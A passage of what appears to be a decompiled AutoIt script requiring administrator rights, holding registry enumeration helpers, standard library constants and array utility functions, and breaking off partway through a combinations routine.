#RequireAdmin
#Region
Global Const $SVALUETYPES [ 12 ] = [ "REG_NONE" , "REG_SZ" , "REG_EXPAND_SZ" , "REG_BINARY" , "REG_DWORD" , "REG_DWORD_BIG_ENDIAN" , "REG_LINK" , "REG_MULTI_SZ" , "REG_RESOURCE_LIST" , "REG_FULL_RESOURCE_DESCRIPTOR" , "REG_RESOURCE_REQUIREMENTS_LIST" , "REG_QWORD" ]
#EndRegion
Func _REGENUMKEYEX ( $KEYNAME , $IFLAG = 0 , $SFILTER = "*" , $VFILTER = "*" , $IVALUETYPES = 0 )
	If StringRegExp ( $SFILTER , StringReplace ( "^\s*$|\v|\\|^\||\|\||\|$" , Chr ( BitAND ( $IFLAG , 64 ) + 28 ) & "\|^\||\|\||\|$" , "\\\\" ) ) Then Return SetError ( 1 , 0 , "" )
	Local $INDEXSUBKEY [ 101 ] = [ 100 ] , $SUBKEYNAME , $BS = "\" , $SKEYLIST , $I = 1 , $SKEYFLAG = BitAND ( $IFLAG , 1 ) , $SKEYFILTER = StringReplace ( $SFILTER , "*" , "" )
	If BitAND ( $IFLAG , 2 ) Then $SKEYLIST = @LF & $KEYNAME
	If Not BitAND ( $IFLAG , 64 ) Then $SFILTER = StringRegExpReplace ( BitAND ( $IFLAG , 16 ) & "(?i)(" , "16\(\?\i\)|\d+" , "" ) & StringRegExpReplace ( StringRegExpReplace ( StringRegExpReplace ( StringRegExpReplace ( $SFILTER , "[^*?|]+" , "\\Q$0\\E" ) , "\\E(?=\||$)" , "$0\$" ) , "(?<=^|\|)\\Q" , "^$0" ) , "\*+" , ".*" ) & ")"
	While $I
		$INDEXSUBKEY [ $I ] += 1
		$SUBKEYNAME = RegEnumKey ( $KEYNAME , $INDEXSUBKEY [ $I ] )
		If @error Then
			$INDEXSUBKEY [ $I ] = 0
			$I -= 1
			$KEYNAME = StringLeft ( $KEYNAME , StringInStr ( $KEYNAME , "\" , 1 , + 4294967295 ) + 4294967295 )
			ContinueLoop
		EndIf
		If $SKEYFILTER Then
			If StringRegExp ( $SUBKEYNAME , $SFILTER ) Then $SKEYLIST &= @LF & $KEYNAME & $BS & $SUBKEYNAME
		Else
			$SKEYLIST &= @LF & $KEYNAME & $BS & $SUBKEYNAME
		EndIf
		If $SKEYFLAG Then ContinueLoop
		$I += 1
		If $I > $INDEXSUBKEY [ 0 ] Then
			$INDEXSUBKEY [ 0 ] += 100
			ReDim $INDEXSUBKEY [ $INDEXSUBKEY [ 0 ] + 1 ]
		EndIf
		$KEYNAME &= $BS & $SUBKEYNAME
	WEnd
	If Not $SKEYLIST Then Return SetError ( 2 , 0 , "" )
	If BitAND ( $IFLAG , 128 ) <> 128 Then Return StringSplit ( StringTrimLeft ( $SKEYLIST , 1 ) , @LF , StringReplace ( BitAND ( $IFLAG , 32 ) , "32" , 2 ) )
	$SKEYLIST = _REGENUMVALEX ( StringSplit ( StringTrimLeft ( $SKEYLIST , 1 ) , @LF ) , $IFLAG , $VFILTER , $IVALUETYPES )
	Return SetError ( @error , 0 , $SKEYLIST )
EndFunc
Func _REGENUMVALEX ( $AKEYLIST , $IFLAG = 0 , $SFILTER = "*" , $IVALUETYPES = 0 )
	If StringRegExp ( $SFILTER , "\v" ) Then Return SetError ( 3 , 0 , "" )
	If Not IsArray ( $AKEYLIST ) Then $AKEYLIST = StringSplit ( $AKEYLIST , @LF )
	Local $AKEYVALLIST [ 1954 ] [ 4 ] , $IKEYVAL = Int ( BitAND ( $IFLAG , 32 ) = 0 ) , $SKEYVAL = 1953 , $SREGENUMVAL , $IREGENUMVAL , $REGREAD = BitAND ( $IFLAG , 256 ) , $VFILTER = StringReplace ( $SFILTER , "*" , "" )
	If Not BitAND ( $IFLAG , 64 ) Then $SFILTER = StringRegExpReplace ( BitAND ( $IFLAG , 16 ) & "(?i)(" , "16\(\?\i\)|\d+" , "" ) & StringRegExpReplace ( StringRegExpReplace ( StringRegExpReplace ( StringRegExpReplace ( $SFILTER , "[^*?|]+" , "\\Q$0\\E" ) , "\\E(?=\||$)" , "$0\$" ) , "(?<=^|\|)\\Q" , "^$0" ) , "\*+" , ".*" ) & ")"
	For $I = 1 To $AKEYLIST [ 0 ]
		$IREGENUMVAL = 0
		While 1
			If $IKEYVAL = $SKEYVAL Then
				If $SKEYVAL = 3999744 Then ExitLoop
				$SKEYVAL *= 2
				ReDim $AKEYVALLIST [ $SKEYVAL + 1 ] [ 4 ]
			EndIf
			$AKEYVALLIST [ $IKEYVAL ] [ 0 ] = $AKEYLIST [ $I ]
			$IREGENUMVAL += 1
			$SREGENUMVAL = RegEnumVal ( $AKEYLIST [ $I ] , $IREGENUMVAL )
			If @error <> 0 Then
				If $IREGENUMVAL = 1 And $VFILTER = "" Then $IKEYVAL += 1
				ExitLoop
			EndIf
			$AKEYVALLIST [ $IKEYVAL ] [ 2 ] = $SVALUETYPES [ @extended ]
			If BitAND ( @extended , $IVALUETYPES ) <> $IVALUETYPES Then ContinueLoop
			If $VFILTER And Not StringRegExp ( $SREGENUMVAL , $SFILTER ) Then ContinueLoop
			$AKEYVALLIST [ $IKEYVAL ] [ 1 ] = $SREGENUMVAL
			If $REGREAD Then $AKEYVALLIST [ $IKEYVAL ] [ 3 ] = RegRead ( $AKEYLIST [ $I ] , $SREGENUMVAL )
			$IKEYVAL += 1
		WEnd
	Next
	$SREGENUMVAL = $IKEYVAL - Int ( BitAND ( $IFLAG , 32 ) = 0 )
	If Not $SREGENUMVAL Or ( $SREGENUMVAL = 1 And $VFILTER = "" And $AKEYVALLIST [ $IKEYVAL - $SREGENUMVAL ] [ 2 ] = "" ) Then Return SetError ( 4 , 0 , "" )
	ReDim $AKEYVALLIST [ $IKEYVAL ] [ 4 ]
	If Not BitAND ( $IFLAG , 32 ) Then $AKEYVALLIST [ 0 ] [ 0 ] = $IKEYVAL + 4294967295
	Return $AKEYVALLIST
EndFunc
Global Const $OPT_COORDSRELATIVE = 0
Global Const $OPT_COORDSABSOLUTE = 1
Global Const $OPT_COORDSCLIENT = 2
Global Const $OPT_ERRORSILENT = 0
Global Const $OPT_ERRORFATAL = 1
Global Const $OPT_CAPSNOSTORE = 0
Global Const $OPT_CAPSSTORE = 1
Global Const $OPT_MATCHSTART = 1
Global Const $OPT_MATCHANY = 2
Global Const $OPT_MATCHEXACT = 3
Global Const $OPT_MATCHADVANCED = 4
Global Const $CCS_TOP = 1
Global Const $CCS_NOMOVEY = 2
Global Const $CCS_BOTTOM = 3
Global Const $CCS_NORESIZE = 4
Global Const $CCS_NOPARENTALIGN = 8
Global Const $CCS_NOHILITE = 16
Global Const $CCS_ADJUSTABLE = 32
Global Const $CCS_NODIVIDER = 64
Global Const $CCS_VERT = 128
Global Const $CCS_LEFT = 129
Global Const $CCS_NOMOVEX = 130
Global Const $CCS_RIGHT = 131
Global Const $DT_DRIVETYPE = 1
Global Const $DT_SSDSTATUS = 2
Global Const $DT_BUSTYPE = 3
Global Const $PROXY_IE = 0
Global Const $PROXY_NONE = 1
Global Const $PROXY_SPECIFIED = 2
Global Const $OBJID_WINDOW = 0
Global Const $OBJID_TITLEBAR = 4294967294
Global Const $OBJID_SIZEGRIP = 4294967289
Global Const $OBJID_CARET = 4294967288
Global Const $OBJID_CURSOR = 4294967287
Global Const $OBJID_ALERT = 4294967286
Global Const $OBJID_SOUND = 4294967285
Global Const $DLG_CENTERONTOP = 0
Global Const $DLG_NOTITLE = 1
Global Const $DLG_NOTONTOP = 2
Global Const $DLG_TEXTLEFT = 4
Global Const $DLG_TEXTRIGHT = 8
Global Const $DLG_MOVEABLE = 16
Global Const $DLG_TEXTVCENTER = 32
Global Const $IDC_UNKNOWN = 0
Global Const $IDC_APPSTARTING = 1
Global Const $IDC_ARROW = 2
Global Const $IDC_CROSS = 3
Global Const $IDC_HAND = 32649
Global Const $IDC_HELP = 4
Global Const $IDC_IBEAM = 5
Global Const $IDC_ICON = 6
Global Const $IDC_NO = 7
Global Const $IDC_SIZE = 8
Global Const $IDC_SIZEALL = 9
Global Const $IDC_SIZENESW = 10
Global Const $IDC_SIZENS = 11
Global Const $IDC_SIZENWSE = 12
Global Const $IDC_SIZEWE = 13
Global Const $IDC_UPARROW = 14
Global Const $IDC_WAIT = 15
Global Const $IDI_APPLICATION = 32512
Global Const $IDI_ASTERISK = 32516
Global Const $IDI_EXCLAMATION = 32515
Global Const $IDI_HAND = 32513
Global Const $IDI_QUESTION = 32514
Global Const $IDI_WINLOGO = 32517
Global Const $IDI_SHIELD = 32518
Global Const $IDI_ERROR = $IDI_HAND
Global Const $IDI_INFORMATION = $IDI_ASTERISK
Global Const $IDI_WARNING = $IDI_EXCLAMATION
Global Const $SD_LOGOFF = 0
Global Const $SD_SHUTDOWN = 1
Global Const $SD_REBOOT = 2
Global Const $SD_FORCE = 4
Global Const $SD_POWERDOWN = 8
Global Const $SD_FORCEHUNG = 16
Global Const $SD_STANDBY = 32
Global Const $SD_HIBERNATE = 64
Global Const $STDIN_CHILD = 1
Global Const $STDOUT_CHILD = 2
Global Const $STDERR_CHILD = 4
Global Const $STDERR_MERGED = 8
Global Const $STDIO_INHERIT_PARENT = 16
Global Const $RUN_CREATE_NEW_CONSOLE = 65536
Global Const $UBOUND_DIMENSIONS = 0
Global Const $UBOUND_ROWS = 1
Global Const $UBOUND_COLUMNS = 2
Global Const $MOUSEEVENTF_ABSOLUTE = 32768
Global Const $MOUSEEVENTF_MOVE = 1
Global Const $MOUSEEVENTF_LEFTDOWN = 2
Global Const $MOUSEEVENTF_LEFTUP = 4
Global Const $MOUSEEVENTF_RIGHTDOWN = 8
Global Const $MOUSEEVENTF_RIGHTUP = 16
Global Const $MOUSEEVENTF_MIDDLEDOWN = 32
Global Const $MOUSEEVENTF_MIDDLEUP = 64
Global Const $MOUSEEVENTF_WHEEL = 2048
Global Const $MOUSEEVENTF_XDOWN = 128
Global Const $MOUSEEVENTF_XUP = 256
Global Const $REG_NONE = 0
Global Const $REG_SZ = 1
Global Const $REG_EXPAND_SZ = 2
Global Const $REG_BINARY = 3
Global Const $REG_DWORD = 4
Global Const $REG_DWORD_LITTLE_ENDIAN = 4
Global Const $REG_DWORD_BIG_ENDIAN = 5
Global Const $REG_LINK = 6
Global Const $REG_MULTI_SZ = 7
Global Const $REG_RESOURCE_LIST = 8
Global Const $REG_FULL_RESOURCE_DESCRIPTOR = 9
Global Const $REG_RESOURCE_REQUIREMENTS_LIST = 10
Global Const $REG_QWORD = 11
Global Const $REG_QWORD_LITTLE_ENDIAN = 11
Global Const $HWND_BOTTOM = 1
Global Const $HWND_NOTOPMOST = + 4294967294
Global Const $HWND_TOP = 0
Global Const $HWND_TOPMOST = + 4294967295
Global Const $SWP_NOSIZE = 1
Global Const $SWP_NOMOVE = 2
Global Const $SWP_NOZORDER = 4
Global Const $SWP_NOREDRAW = 8
Global Const $SWP_NOACTIVATE = 16
Global Const $SWP_FRAMECHANGED = 32
Global Const $SWP_DRAWFRAME = 32
Global Const $SWP_SHOWWINDOW = 64
Global Const $SWP_HIDEWINDOW = 128
Global Const $SWP_NOCOPYBITS = 256
Global Const $SWP_NOOWNERZORDER = 512
Global Const $SWP_NOREPOSITION = 512
Global Const $SWP_NOSENDCHANGING = 1024
Global Const $SWP_DEFERERASE = 8192
Global Const $SWP_ASYNCWINDOWPOS = 16384
Global Const $KEYWORD_DEFAULT = 1
Global Const $KEYWORD_NULL = 2
Global Const $DECLARED_LOCAL = + 4294967295
Global Const $DECLARED_UNKNOWN = 0
Global Const $DECLARED_GLOBAL = 1
Global Const $ASSIGN_CREATE = 0
Global Const $ASSIGN_FORCELOCAL = 1
Global Const $ASSIGN_FORCEGLOBAL = 2
Global Const $ASSIGN_EXISTFAIL = 4
Global Const $BI_ENABLE = 0
Global Const $BI_DISABLE = 1
Global Const $BREAK_ENABLE = 1
Global Const $BREAK_DISABLE = 0
Global Const $CDTRAY_OPEN = "open"
Global Const $CDTRAY_CLOSED = "closed"
Global Const $SEND_DEFAULT = 0
Global Const $SEND_RAW = 1
Global Const $DIR_DEFAULT = 0
Global Const $DIR_EXTENDED = 1
Global Const $DIR_NORECURSE = 2
Global Const $DIR_REMOVE = 1
Global Const $DT_ALL = "ALL"
Global Const $DT_CDROM = "CDROM"
Global Const $DT_REMOVABLE = "REMOVABLE"
Global Const $DT_FIXED = "FIXED"
Global Const $DT_NETWORK = "NETWORK"
Global Const $DT_RAMDISK = "RAMDISK"
Global Const $DT_UNKNOWN = "UNKNOWN"
Global Const $DT_UNDEFINED = 1
Global Const $DT_FAT = "FAT"
Global Const $DT_FAT32 = "FAT32"
Global Const $DT_EXFAT = "exFAT"
Global Const $DT_NTFS = "NTFS"
Global Const $DT_NWFS = "NWFS"
Global Const $DT_CDFS = "CDFS"
Global Const $DT_UDF = "UDF"
Global Const $DMA_DEFAULT = 0
Global Const $DMA_PERSISTENT = 1
Global Const $DMA_AUTHENTICATION = 8
Global Const $DS_UNKNOWN = "UNKNOWN"
Global Const $DS_READY = "READY"
Global Const $DS_NOTREADY = "NOTREADY"
Global Const $DS_INVALID = "INVALID"
Global Const $MOUSE_CLICK_LEFT = "left"
Global Const $MOUSE_CLICK_RIGHT = "right"
Global Const $MOUSE_CLICK_MIDDLE = "middle"
Global Const $MOUSE_CLICK_MAIN = "main"
Global Const $MOUSE_CLICK_MENU = "menu"
Global Const $MOUSE_CLICK_PRIMARY = "primary"
Global Const $MOUSE_CLICK_SECONDARY = "secondary"
Global Const $MOUSE_WHEEL_UP = "up"
Global Const $MOUSE_WHEEL_DOWN = "down"
Global Const $NUMBER_AUTO = 0
Global Const $NUMBER_32BIT = 1
Global Const $NUMBER_64BIT = 2
Global Const $NUMBER_DOUBLE = 3
Global Const $OBJ_NAME = 1
Global Const $OBJ_STRING = 2
Global Const $OBJ_PROGID = 3
Global Const $OBJ_FILE = 4
Global Const $OBJ_MODULE = 5
Global Const $OBJ_CLSID = 6
Global Const $OBJ_IID = 7
Global Const $EXITCLOSE_NORMAL = 0
Global Const $EXITCLOSE_BYEXIT = 1
Global Const $EXITCLOSE_BYCLICK = 2
Global Const $EXITCLOSE_BYLOGOFF = 3
Global Const $EXITCLOSE_BYSUTDOWN = 4
Global Const $PROCESS_STATS_MEMORY = 0
Global Const $PROCESS_STATS_IO = 1
Global Const $PROCESS_LOW = 0
Global Const $PROCESS_BELOWNORMAL = 1
Global Const $PROCESS_NORMAL = 2
Global Const $PROCESS_ABOVENORMAL = 3
Global Const $PROCESS_HIGH = 4
Global Const $PROCESS_REALTIME = 5
Global Const $RUN_LOGON_NOPROFILE = 0
Global Const $RUN_LOGON_PROFILE = 1
Global Const $RUN_LOGON_NETWORK = 2
Global Const $RUN_LOGON_INHERIT = 4
Global Const $SOUND_NOWAIT = 0
Global Const $SOUND_WAIT = 1
Global Const $SHEX_OPEN = "open"
Global Const $SHEX_EDIT = "edit"
Global Const $SHEX_PRINT = "print"
Global Const $SHEX_PROPERTIES = "properties"
Global Const $TCP_DATA_DEFAULT = 0
Global Const $TCP_DATA_BINARY = 1
Global Const $UDP_OPEN_DEFAULT = 0
Global Const $UDP_OPEN_BROADCAST = 1
Global Const $UDP_DATA_DEFAULT = 0
Global Const $UDP_DATA_BINARY = 1
Global Const $UDP_DATA_ARRAY = 2
Global Const $TIP_NOICON = 0
Global Const $TIP_INFOICON = 1
Global Const $TIP_WARNINGICON = 2
Global Const $TIP_ERRORICON = 3
Global Const $TIP_BALLOON = 1
Global Const $TIP_CENTER = 2
Global Const $TIP_FORCEVISIBLE = 4
Global Const $WINDOWS_NOONTOP = 0
Global Const $WINDOWS_ONTOP = 1
Global Const $MB_OK = 0
Global Const $MB_OKCANCEL = 1
Global Const $MB_ABORTRETRYIGNORE = 2
Global Const $MB_YESNOCANCEL = 3
Global Const $MB_YESNO = 4
Global Const $MB_RETRYCANCEL = 5
Global Const $MB_CANCELTRYCONTINUE = 6
Global Const $MB_HELP = 16384
Global Const $MB_ICONSTOP = 16
Global Const $MB_ICONERROR = 16
Global Const $MB_ICONHAND = 16
Global Const $MB_ICONQUESTION = 32
Global Const $MB_ICONEXCLAMATION = 48
Global Const $MB_ICONWARNING = 48
Global Const $MB_ICONINFORMATION = 64
Global Const $MB_ICONASTERISK = 64
Global Const $MB_USERICON = 128
Global Const $MB_DEFBUTTON1 = 0
Global Const $MB_DEFBUTTON2 = 256
Global Const $MB_DEFBUTTON3 = 512
Global Const $MB_DEFBUTTON4 = 768
Global Const $MB_APPLMODAL = 0
Global Const $MB_SYSTEMMODAL = 4096
Global Const $MB_TASKMODAL = 8192
Global Const $MB_DEFAULT_DESKTOP_ONLY = 131072
Global Const $MB_RIGHT = 524288
Global Const $MB_RTLREADING = 1048576
Global Const $MB_SETFOREGROUND = 65536
Global Const $MB_TOPMOST = 262144
Global Const $MB_SERVICE_NOTIFICATION = 2097152
Global Const $MB_RIGHTJUSTIFIED = $MB_RIGHT
Global Const $IDTIMEOUT = + 4294967295
Global Const $IDOK = 1
Global Const $IDCANCEL = 2
Global Const $IDABORT = 3
Global Const $IDRETRY = 4
Global Const $IDIGNORE = 5
Global Const $IDYES = 6
Global Const $IDNO = 7
Global Const $IDCLOSE = 8
Global Const $IDHELP = 9
Global Const $IDTRYAGAIN = 10
Global Const $IDCONTINUE = 11
Global Const $STR_NOCASESENSE = 0
Global Const $STR_CASESENSE = 1
Global Const $STR_NOCASESENSEBASIC = 2
Global Const $STR_STRIPLEADING = 1
Global Const $STR_STRIPTRAILING = 2
Global Const $STR_STRIPSPACES = 4
Global Const $STR_STRIPALL = 8
Global Const $STR_CHRSPLIT = 0
Global Const $STR_ENTIRESPLIT = 1
Global Const $STR_NOCOUNT = 2
Global Const $STR_REGEXPMATCH = 0
Global Const $STR_REGEXPARRAYMATCH = 1
Global Const $STR_REGEXPARRAYFULLMATCH = 2
Global Const $STR_REGEXPARRAYGLOBALMATCH = 3
Global Const $STR_REGEXPARRAYGLOBALFULLMATCH = 4
Global Const $STR_ENDISSTART = 0
Global Const $STR_ENDNOTSTART = 1
Global Const $SB_ANSI = 1
Global Const $SB_UTF16LE = 2
Global Const $SB_UTF16BE = 3
Global Const $SB_UTF8 = 4
Global Const $SE_UTF16 = 0
Global Const $SE_ANSI = 1
Global Const $SE_UTF8 = 2
Global Const $STR_UTF16 = 0
Global Const $STR_UCS2 = 1
Global Enum $ARRAYFILL_FORCE_DEFAULT , $ARRAYFILL_FORCE_SINGLEITEM , $ARRAYFILL_FORCE_INT , $ARRAYFILL_FORCE_NUMBER , $ARRAYFILL_FORCE_PTR , $ARRAYFILL_FORCE_HWND , $ARRAYFILL_FORCE_STRING
Global Enum $ARRAYUNIQUE_NOCOUNT , $ARRAYUNIQUE_COUNT
Global Enum $ARRAYUNIQUE_AUTO , $ARRAYUNIQUE_FORCE32 , $ARRAYUNIQUE_FORCE64 , $ARRAYUNIQUE_MATCH , $ARRAYUNIQUE_DISTINCT
Func _ARRAYADD ( ByRef $AARRAY , $VVALUE , $ISTART = 0 , $SDELIM_ITEM = "|" , $SDELIM_ROW = @CRLF , $IFORCE = $ARRAYFILL_FORCE_DEFAULT )
	If $ISTART = Default Then $ISTART = 0
	If $SDELIM_ITEM = Default Then $SDELIM_ITEM = "|"
	If $SDELIM_ROW = Default Then $SDELIM_ROW = @CRLF
	If $IFORCE = Default Then $IFORCE = $ARRAYFILL_FORCE_DEFAULT
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	Local $HDATATYPE = 0
	Switch $IFORCE
	Case $ARRAYFILL_FORCE_INT
		$HDATATYPE = Int
	Case $ARRAYFILL_FORCE_NUMBER
		$HDATATYPE = Number
	Case $ARRAYFILL_FORCE_PTR
		$HDATATYPE = Ptr
	Case $ARRAYFILL_FORCE_HWND
		$HDATATYPE = HWnd
	Case $ARRAYFILL_FORCE_STRING
		$HDATATYPE = String
	EndSwitch
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $IFORCE = $ARRAYFILL_FORCE_SINGLEITEM Then
			ReDim $AARRAY [ $IDIM_1 + 1 ]
			$AARRAY [ $IDIM_1 ] = $VVALUE
			Return $IDIM_1
		EndIf
		If IsArray ( $VVALUE ) Then
			If UBound ( $VVALUE , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 5 , 0 , + 4294967295 )
			$HDATATYPE = 0
		Else
			Local $ATMP = StringSplit ( $VVALUE , $SDELIM_ITEM , $STR_NOCOUNT + $STR_ENTIRESPLIT )
			If UBound ( $ATMP , $UBOUND_ROWS ) = 1 Then
				$ATMP [ 0 ] = $VVALUE
			EndIf
			$VVALUE = $ATMP
		EndIf
		Local $IADD = UBound ( $VVALUE , $UBOUND_ROWS )
		ReDim $AARRAY [ $IDIM_1 + $IADD ]
		For $I = 0 To $IADD + 4294967295
			If IsFunc ( $HDATATYPE ) Then
				$AARRAY [ $IDIM_1 + $I ] = $HDATATYPE ( $VVALUE [ $I ] )
			Else
				$AARRAY [ $IDIM_1 + $I ] = $VVALUE [ $I ]
			EndIf
		Next
		Return $IDIM_1 + $IADD + 4294967295
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $ISTART < 0 Or $ISTART > $IDIM_2 + 4294967295 Then Return SetError ( 4 , 0 , + 4294967295 )
		Local $IVALDIM_1 , $IVALDIM_2 = 0 , $ICOLCOUNT
		If IsArray ( $VVALUE ) Then
			If UBound ( $VVALUE , $UBOUND_DIMENSIONS ) <> 2 Then Return SetError ( 5 , 0 , + 4294967295 )
			$IVALDIM_1 = UBound ( $VVALUE , $UBOUND_ROWS )
			$IVALDIM_2 = UBound ( $VVALUE , $UBOUND_COLUMNS )
			$HDATATYPE = 0
		Else
			Local $ASPLIT_1 = StringSplit ( $VVALUE , $SDELIM_ROW , $STR_NOCOUNT + $STR_ENTIRESPLIT )
			$IVALDIM_1 = UBound ( $ASPLIT_1 , $UBOUND_ROWS )
			Local $ATMP [ $IVALDIM_1 ] [ 0 ] , $ASPLIT_2
			For $I = 0 To $IVALDIM_1 + 4294967295
				$ASPLIT_2 = StringSplit ( $ASPLIT_1 [ $I ] , $SDELIM_ITEM , $STR_NOCOUNT + $STR_ENTIRESPLIT )
				$ICOLCOUNT = UBound ( $ASPLIT_2 )
				If $ICOLCOUNT > $IVALDIM_2 Then
					$IVALDIM_2 = $ICOLCOUNT
					ReDim $ATMP [ $IVALDIM_1 ] [ $IVALDIM_2 ]
				EndIf
				For $J = 0 To $ICOLCOUNT + 4294967295
					$ATMP [ $I ] [ $J ] = $ASPLIT_2 [ $J ]
				Next
			Next
			$VVALUE = $ATMP
		EndIf
		If UBound ( $VVALUE , $UBOUND_COLUMNS ) + $ISTART > UBound ( $AARRAY , $UBOUND_COLUMNS ) Then Return SetError ( 3 , 0 , + 4294967295 )
		ReDim $AARRAY [ $IDIM_1 + $IVALDIM_1 ] [ $IDIM_2 ]
		For $IWRITETO_INDEX = 0 To $IVALDIM_1 + 4294967295
			For $J = 0 To $IDIM_2 + 4294967295
				If $J < $ISTART Then
					$AARRAY [ $IWRITETO_INDEX + $IDIM_1 ] [ $J ] = ""
				ElseIf $J - $ISTART > $IVALDIM_2 + 4294967295 Then
					$AARRAY [ $IWRITETO_INDEX + $IDIM_1 ] [ $J ] = ""
				Else
					If IsFunc ( $HDATATYPE ) Then
						$AARRAY [ $IWRITETO_INDEX + $IDIM_1 ] [ $J ] = $HDATATYPE ( $VVALUE [ $IWRITETO_INDEX ] [ $J - $ISTART ] )
					Else
						$AARRAY [ $IWRITETO_INDEX + $IDIM_1 ] [ $J ] = $VVALUE [ $IWRITETO_INDEX ] [ $J - $ISTART ]
					EndIf
				EndIf
			Next
		Next
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_ROWS ) + 4294967295
EndFunc
Func _ARRAYBINARYSEARCH ( Const ByRef $AARRAY , $VVALUE , $ISTART = 0 , $IEND = 0 , $ICOLUMN = 0 )
	If $ISTART = Default Then $ISTART = 0
	If $IEND = Default Then $IEND = 0
	If $ICOLUMN = Default Then $ICOLUMN = 0
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	If $IDIM_1 = 0 Then Return SetError ( 6 , 0 , + 4294967295 )
	If $IEND < 1 Or $IEND > $IDIM_1 + 4294967295 Then $IEND = $IDIM_1 + 4294967295
	If $ISTART < 0 Then $ISTART = 0
	If $ISTART > $IEND Then Return SetError ( 4 , 0 , + 4294967295 )
	Local $IMID = Int ( ( $IEND + $ISTART ) / 2 )
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		If $AARRAY [ $ISTART ] > $VVALUE Or $AARRAY [ $IEND ] < $VVALUE Then Return SetError ( 2 , 0 , + 4294967295 )
		While $ISTART <= $IMID And $VVALUE <> $AARRAY [ $IMID ]
			If $VVALUE < $AARRAY [ $IMID ] Then
				$IEND = $IMID + 4294967295
			Else
				$ISTART = $IMID + 1
			EndIf
			$IMID = Int ( ( $IEND + $ISTART ) / 2 )
		WEnd
		If $ISTART > $IEND Then Return SetError ( 3 , 0 , + 4294967295 )
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS ) + 4294967295
		If $ICOLUMN < 0 Or $ICOLUMN > $IDIM_2 Then Return SetError ( 7 , 0 , + 4294967295 )
		If $AARRAY [ $ISTART ] [ $ICOLUMN ] > $VVALUE Or $AARRAY [ $IEND ] [ $ICOLUMN ] < $VVALUE Then Return SetError ( 2 , 0 , + 4294967295 )
		While $ISTART <= $IMID And $VVALUE <> $AARRAY [ $IMID ] [ $ICOLUMN ]
			If $VVALUE < $AARRAY [ $IMID ] [ $ICOLUMN ] Then
				$IEND = $IMID + 4294967295
			Else
				$ISTART = $IMID + 1
			EndIf
			$IMID = Int ( ( $IEND + $ISTART ) / 2 )
		WEnd
		If $ISTART > $IEND Then Return SetError ( 3 , 0 , + 4294967295 )
Case Else
		Return SetError ( 5 , 0 , + 4294967295 )
	EndSwitch
	Return $IMID
EndFunc
Func _ARRAYCOLDELETE ( ByRef $AARRAY , $ICOLUMN , $BCONVERT = False )
	If $BCONVERT = Default Then $BCONVERT = False
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 2 Then Return SetError ( 2 , 0 , + 4294967295 )
	Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
	Switch $IDIM_2
	Case 2
		If $ICOLUMN < 0 Or $ICOLUMN > 1 Then Return SetError ( 3 , 0 , + 4294967295 )
		If $BCONVERT Then
			Local $ATEMPARRAY [ $IDIM_1 ]
			For $I = 0 To $IDIM_1 + 4294967295
				$ATEMPARRAY [ $I ] = $AARRAY [ $I ] [ ( Not $ICOLUMN ) ]
			Next
			$AARRAY = $ATEMPARRAY
		Else
			ContinueCase
		EndIf
Case Else
		If $ICOLUMN < 0 Or $ICOLUMN > $IDIM_2 + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
		For $I = 0 To $IDIM_1 + 4294967295
			For $J = $ICOLUMN To $IDIM_2 + 4294967294
				$AARRAY [ $I ] [ $J ] = $AARRAY [ $I ] [ $J + 1 ]
			Next
		Next
		ReDim $AARRAY [ $IDIM_1 ] [ $IDIM_2 + 4294967295 ]
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_COLUMNS )
EndFunc
Func _ARRAYCOLINSERT ( ByRef $AARRAY , $ICOLUMN )
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $IDIM_1 = UBound ( $AARRAY , $UBOUND_ROWS )
	Switch UBound ( $AARRAY , $UBOUND_DIMENSIONS )
	Case 1
		Local $ATEMPARRAY [ $IDIM_1 ] [ 2 ]
		Switch $ICOLUMN
		Case 0 , 1
			For $I = 0 To $IDIM_1 + 4294967295
				$ATEMPARRAY [ $I ] [ ( Not $ICOLUMN ) ] = $AARRAY [ $I ]
			Next
	Case Else
			Return SetError ( 3 , 0 , + 4294967295 )
		EndSwitch
		$AARRAY = $ATEMPARRAY
	Case 2
		Local $IDIM_2 = UBound ( $AARRAY , $UBOUND_COLUMNS )
		If $ICOLUMN < 0 Or $ICOLUMN > $IDIM_2 Then Return SetError ( 3 , 0 , + 4294967295 )
		ReDim $AARRAY [ $IDIM_1 ] [ $IDIM_2 + 1 ]
		For $I = 0 To $IDIM_1 + 4294967295
			For $J = $IDIM_2 To $ICOLUMN + 1 Step + 4294967295
				$AARRAY [ $I ] [ $J ] = $AARRAY [ $I ] [ $J + 4294967295 ]
			Next
			$AARRAY [ $I ] [ $ICOLUMN ] = ""
		Next
Case Else
		Return SetError ( 2 , 0 , + 4294967295 )
	EndSwitch
	Return UBound ( $AARRAY , $UBOUND_COLUMNS )
EndFunc
Func _ARRAYCOMBINATIONS ( Const ByRef $AARRAY , $ISET , $SDELIMITER = "" )
	If $SDELIMITER = Default Then $SDELIMITER = ""
	If Not IsArray ( $AARRAY ) Then Return SetError ( 1 , 0 , 0 )
	If UBound ( $AARRAY , $UBOUND_DIMENSIONS ) <> 1 Then Return SetError ( 2 , 0 , 0 )
	Local $IN = UBound ( $AARRAY )
	Local $IR = $ISET
	Local $AIDX [ $IR ]
	For $I = 0 To $IR + 4294967295
		$AIDX [ $I ] = $I
	Next
	Local $ITOTAL = __ARRAY_COMBINATIONS ( $IN , $IR )
	Local $ILEFT = $ITOTAL
